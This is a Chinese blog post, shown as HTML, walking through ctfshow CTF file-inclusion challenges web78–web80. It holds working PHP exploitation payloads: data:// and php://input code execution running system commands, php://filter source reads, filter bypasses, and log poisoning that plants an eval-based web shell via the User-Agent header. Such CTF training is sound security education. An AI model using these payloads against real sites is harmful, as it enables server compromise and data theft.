<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="这篇文章的知识点大部分已经移到另一篇文章了 0x02题目web78 典型的文件包含include()函数并不在意被包含的文件是什么类型，只要有php代码，都会被解析出来。 我们采用伪协议去做 php伪协议做法: 做法一:采用data伪协议 123?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&#x27;ls&#x27;);?&gt;?file&#x3D;data:&#x2F;&#x2F;tex">
<meta property="og:type" content="article">
<meta property="og:title" content="web入门文件包含篇-ctfshow">
<meta property="og:url" content="https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/index.html">
<meta property="og:site_name" content="root@wanth3f1ag">
<meta property="og:description" content="这篇文章的知识点大部分已经移到另一篇文章了 0x02题目web78 典型的文件包含include()函数并不在意被包含的文件是什么类型，只要有php代码，都会被解析出来。 我们采用伪协议去做 php伪协议做法: 做法一:采用data伪协议 123?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&#x27;ls&#x27;);?&gt;?file&#x3D;data:&#x2F;&#x2F;tex">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730028479242-bc1adeb6-66d3-4ccc-8872-1252551f0a4c.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730285657191-4bfa4190-aaad-47f5-bdd2-6eb3ad56f460.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730030606040-7bf50287-c040-4e27-b8e6-d2145f24eace.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730032976505-90251105-1c5f-4a94-b1bd-9ece517a5765.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730033474959-2d0a9681-3616-46dc-9aff-da7c9efb43b4.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730034742978-a281454d-c022-4ef8-b0fb-0949ae243cc3.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730034980099-331bfbbb-173e-4fd7-bca3-926bf514ad24.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730035074565-7869069e-1183-4604-b1dc-e2aa014ea974.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730035246928-fd5d12ee-0eee-47db-a364-201f23135f87.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730035297273-eaa66c84-0578-4323-bd02-cec7ece1fd69.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730035347028-159bb973-787f-4eb3-9057-2400233642cb.jpeg">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730293603142-e3d26032-d061-411c-9f51-7cefb9e3eff1.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730293746433-317ecf29-87ce-4113-8e0b-291f7f102dc5.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730294322303-0b2b3651-e7a9-48c8-9eef-2708b8cc036a.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730294307149-908a8a99-41f9-4eb5-beaa-34fd37f3b919.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730296283509-f13cd684-5eed-4a7a-9faf-134ddea05039.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730300488029-894f411d-ee24-49ee-92a7-d07d0be5da74.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730300529394-4081f140-02ec-4af6-9752-0690d78d07a4.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730378443258-51ac2e09-3fb8-4d5d-8eab-d0f18e2c08cf.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730380946270-8752299b-30ea-48a0-8e64-e2144a8d502b.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730390601812-e5d1e52c-e755-433e-abac-2187befdff67.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730392984123-c15ea09a-64a0-487a-90d6-0e1a026c17fd.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730393020737-c16d92aa-9fb3-4d03-9965-50bc47f3cf8a.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730394008762-1f4d5086-c564-4870-bd5c-4a07dfd049ad.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730394986525-f1c33433-17cf-46fd-b824-e04ae1a7c1ed.png">
<meta property="article:published_time" content="2024-12-03T06:29:06.000Z">
<meta property="article:modified_time" content="2025-05-16T03:43:21.337Z">
<meta property="article:author" content="wanTh3flag">
<meta property="article:tag" content="文件包含">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730028479242-bc1adeb6-66d3-4ccc-8872-1252551f0a4c.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>web入门文件包含篇-ctfshow</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">H0me</a></li><!--
     --><!--
       --><li><a href="/about/">A6out</a></li><!--
     --><!--
       --><li><a href="/tags/">T6gs</a></li><!--
     --><!--
       --><li><a href="/categories/">Catagory</a></li><!--
     --><!--
       --><li><a href="/links/">L1nks</a></li><!--
     --><!--
       --><li><a href="/search/">s4arch</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/12/13/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/12/02/sqlmap%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E7%9A%84%E6%91%98%E5%BD%95/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/&text=web入门文件包含篇-ctfshow"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/&title=web入门文件包含篇-ctfshow"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/&is_video=false&description=web入门文件包含篇-ctfshow"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=web入门文件包含篇-ctfshow&body=Check out this article: https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/&title=web入门文件包含篇-ctfshow"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/&title=web入门文件包含篇-ctfshow"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/&title=web入门文件包含篇-ctfshow"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/&title=web入门文件包含篇-ctfshow"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/&name=web入门文件包含篇-ctfshow&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/&t=web入门文件包含篇-ctfshow"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02%E9%A2%98%E7%9B%AE"><span class="toc-number">1.</span> <span class="toc-text">0x02题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web78"><span class="toc-number">1.1.</span> <span class="toc-text">web78</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text">php伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#data-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">data:&#x2F;&#x2F;伪协议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-input"><span class="toc-number">1.1.2.</span> <span class="toc-text">php:&#x2F;&#x2F;input</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web79"><span class="toc-number">1.2.</span> <span class="toc-text">web79</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E4%B9%8B"><span class="toc-number">1.2.1.</span> <span class="toc-text">php之&lt;?&#x3D; ?&gt;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%87%E7%94%A8%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.2.</span> <span class="toc-text">采用大小写绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web80"><span class="toc-number">1.3.</span> <span class="toc-text">web80</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web81"><span class="toc-number">1.4.</span> <span class="toc-text">web81</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.4.1.</span> <span class="toc-text">#日志文件包含</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web82"><span class="toc-number">1.5.</span> <span class="toc-text">web82</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.5.1.</span> <span class="toc-text">session文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Session%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">Session的工作原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">利用session.upload_progress进行文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BAsession%E6%96%87%E4%BB%B6%E5%91%A2%E3%80%82"><span class="toc-number">1.5.1.3.</span> <span class="toc-text">如何创建session文件呢。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE%E5%AF%BC%E8%87%B4%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%90%8E%EF%BC%8Csession%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E7%AB%8B%E5%8D%B3%E6%B8%85%E7%A9%BA%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E8%A6%81%E6%83%B3%E5%8A%9E%E6%B3%95%E6%8A%8Asession%E7%95%99%E5%9C%A8%E9%87%8C%E9%9D%A2%EF%BC%8C%E6%89%80%E4%BB%A5%E5%B0%B1%E8%A6%81%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%EF%BC%8C%E5%9C%A8session%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%B8%85%E7%A9%BA%E5%89%8D%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8%E3%80%82"><span class="toc-number">1.5.1.4.</span> <span class="toc-text">默认配置导致文件上传后，session文件内容立即清空，所以我们要想办法把session留在里面，所以就要利用条件竞争，在session文件内容清空前进行文件包含利用。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-%E5%80%9F%E5%8A%A9Burp-Suite"><span class="toc-number">1.5.1.5.</span> <span class="toc-text">方法一 | 借助Burp Suite</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">1.5.2.</span> <span class="toc-text">条件竞争</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">概念</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%A7%E7%94%9F%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">产生条件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8PHP-SESSION-UPLOAD-PROGRESS%E5%8A%A0%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.5.3.</span> <span class="toc-text">利用PHP_SESSION_UPLOAD_PROGRESS加条件竞争进行文件包含</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web83"><span class="toc-number">1.6.</span> <span class="toc-text">web83</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E8%84%9A%E6%9C%AC"><span class="toc-number">1.6.1.</span> <span class="toc-text">用脚本:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web84"><span class="toc-number">1.7.</span> <span class="toc-text">web84</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web85"><span class="toc-number">1.8.</span> <span class="toc-text">web85</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#file-get-contents-%E5%87%BD%E6%95%B0"><span class="toc-number">1.8.1.</span> <span class="toc-text">file_get_contents()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#strpos-%E5%87%BD%E6%95%B0"><span class="toc-number">1.8.2.</span> <span class="toc-text">strpos()函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web86"><span class="toc-number">1.9.</span> <span class="toc-text">web86</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web87"><span class="toc-number">1.10.</span> <span class="toc-text">web87</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php-filter-%E6%B5%81%E7%9A%84-base64-decode-%E6%96%B9%E6%B3%95"><span class="toc-number">1.10.1.</span> <span class="toc-text">php:&#x2F;&#x2F;filter 流的 base64-decode 方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-rot13-%E7%BC%96%E7%A0%81%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87"><span class="toc-number">1.10.2.</span> <span class="toc-text">通过 rot13 编码实现绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-strip-tags-%E5%87%BD%E6%95%B0%E5%8E%BB%E9%99%A4-XML-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.10.3.</span> <span class="toc-text">通过 strip_tags 函数去除 XML 标签</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#strip-tags%E5%87%BD%E6%95%B0"><span class="toc-number">1.10.3.1.</span> <span class="toc-text">strip_tags函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web88"><span class="toc-number">1.11.</span> <span class="toc-text">web88</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        web入门文件包含篇-ctfshow
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">wanTh3flag</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-12-03T06:29:06.000Z" class="dt-published" itemprop="datePublished">2024-12-03</time>
        
        (Updated: <time datetime="2025-05-16T03:43:21.337Z" class="dt-updated" itemprop="dateModified">2025-05-16</time>)
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/ctfshow/">ctfshow</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>这篇文章的知识点大部分已经移到另一篇文章了</p>
<h1 id="0x02题目"><a href="#0x02题目" class="headerlink" title="0x02题目"></a>0x02题目</h1><h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730028479242-bc1adeb6-66d3-4ccc-8872-1252551f0a4c.png" alt="img"></p>
<p>典型的文件包含<strong>include()函数并不在意被包含的文件是什么类型，只要有php代码，都会被解析出来</strong>。</p>
<p>我们采用伪协议去做</p>
<h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p>做法:</p>
<p>做法一:采用data伪协议</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br><span class="line"></span><br><span class="line">?file=data://text/plain,&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data:&#x2F;&#x2F;伪协议"></a>data:&#x2F;&#x2F;伪协议</h4><p>data:&#x2F;&#x2F; 是一个流封装器（stream wrapper），它允许你读取或写入数据作为文件流，而不是从实际的磁盘文件中，可以让用户来控制输入流，<strong>当它与include()包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行</strong></p>
<p>做法二:采用filiter</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<p>利用filter协议读文件±，将flag.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。</p>
<p>做法三:用input伪协议</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=php://input并提交POST请求包数据:&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br><span class="line"></span><br><span class="line">?file=php://input并提交POST请求包数据:&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<p>(可以用hackbar提交也可以用burpsuite进行提交)</p>
<p>把传递方式改成POST方式，再添加php代码</p>
<p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730285657191-4bfa4190-aaad-47f5-bdd2-6eb3ad56f460.png" alt="img"></p>
<h3 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p>php:&#x2F;&#x2F;input    是个可以访问请求的原始数据的只读流。可以接收post请求作为输入流的输入，将请求作为PHP代码的输入传递给目标变量，以达到以post 的形式进行输入的目的。</p>
<h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730030606040-7bf50287-c040-4e27-b8e6-d2145f24eace.png" alt="img"></p>
<p>题目过滤了php，所以我们应该绕过php</p>
<p>做法一:data 通配符绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?=system(&#x27;ls&#x27;);?&gt;</span><br><span class="line"></span><br><span class="line">?file=data://text/plain,&lt;?=system(&#x27;tac flag.???&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<p>注意:如果是用?进行匹配，需要写成flag.???,如果是用<em>的话只需要fla</em>就行，因为*是匹配多个字符的，?只能匹配一个字符</p>
<h3 id="php之"><a href="#php之" class="headerlink" title="php之&lt;?&#x3D; ?&gt;"></a>php之&lt;?&#x3D; ?&gt;</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;? ?&gt;`相当于对`&lt;?php ?&gt;`的替换。而`&lt;?= ?&gt;`则是相当于`&lt;?php echo ... ?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="采用大小写绕过"><a href="#采用大小写绕过" class="headerlink" title="采用大小写绕过"></a>采用大小写绕过</h3><p>做法二:<strong>input协议 大小写绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?file=PhP://input</span><br><span class="line"></span><br><span class="line">&lt;?PhP system(&#x27;ls&#x27;);?&gt;</span><br><span class="line"></span><br><span class="line">?file=PhP://input</span><br><span class="line"></span><br><span class="line">&lt;?PhP system(&#x27;tac flag*&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<p>以上两种方法都是可以绕过的，主要是看想用哪个</p>
<h2 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h2><p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730032976505-90251105-1c5f-4a94-b1bd-9ece517a5765.png" alt="img"></p>
<p>这次data和php都被过滤了，由于不确定flag的位置，所以我们用input协议</p>
<p>?file&#x3D;Php:&#x2F;&#x2F;input上交然后用burpsuite抓包，并用POST提交一个&lt;?&#x3D;system(‘ls’);?&gt;</p>
<p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730033474959-2d0a9681-3616-46dc-9aff-da7c9efb43b4.png" alt="img"></p>
<p>换成tac fl0g.???就可以了，也可以用大小写绕过</p>
<p>还可以用日志文件包含</p>
<p>访问?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
<p>先添加user-agetn头:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=eval($_GET[2]);?&gt;</span><br></pre></td></tr></table></figure>

<p>执行<code>?file=/var/log/nginx/access.log&amp;2=system(&#39;ls /var/www/html&#39;);phpinfo();</code></p>
